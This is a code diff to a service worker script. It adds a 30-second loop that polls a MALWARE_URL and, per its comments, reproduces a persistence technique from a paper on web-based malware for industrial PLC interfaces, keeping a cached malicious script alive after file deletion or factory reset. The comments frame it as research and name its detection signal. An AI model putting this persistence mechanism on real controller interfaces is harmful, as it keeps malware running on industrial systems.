@@ -53,7 +53,25 @@ self.addEventListener('install', function(event) {
 // ---------------------------------------------------------------------------
 self.addEventListener('activate', function(event) {
     console.log('[SW] Activating — claiming all clients');
-    event.waitUntil(self.clients.claim());
+    event.waitUntil(
+        self.clients.claim().then(function() {
+            // Periodically check whether the malware file still exists on the
+            // server (Figure 4, Zonouz et al. NDSS 2024 — "Check Existence" loop).
+            // If the server returns 404 (factory reset / file deletion), the fetch
+            // event listener above will serve the cached copy on the next page load.
+            // These periodic GETs are the detectable signal: a legitimate PLC web
+            // interface never repeatedly polls a fixed JS file at regular intervals.
+            setInterval(function() {
+                fetch(MALWARE_URL, {cache: 'no-store'})
+                    .then(function(r) {
+                        console.log('[SW] Existence check:', MALWARE_URL, r.status);
+                    })
+                    .catch(function() {
+                        console.log('[SW] Server unreachable during existence check');
+                    });
+            }, 30000); // 30 seconds — paper uses similar periodic check cadence
+        })
+    );
 });
 
 // ---------------------------------------------------------------------------
